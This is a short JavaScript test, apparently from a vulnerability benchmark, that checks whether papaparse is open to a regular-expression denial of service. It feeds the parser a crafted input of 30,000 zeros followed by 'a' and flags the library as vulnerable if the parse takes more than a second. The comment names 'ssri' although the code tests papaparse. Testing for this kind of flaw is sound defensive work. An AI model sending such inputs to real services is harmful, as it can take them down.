// test("ReDos in ssri", () => {
  const measureTime = require("../utils").measureTime;
  const Papa = require("papaparse");
  const input = "0".repeat(30000);
  const options = { dynamicTyping: true };
  let t = measureTime(function () {
    Papa.parse(input + "a", options);
  });
  let time = t[0] + t[1] / 1000000000;
if (time > 1) {
	console.log("this_is_vulnerable")
} else {
	console.log("this_is_OK")
}
// });
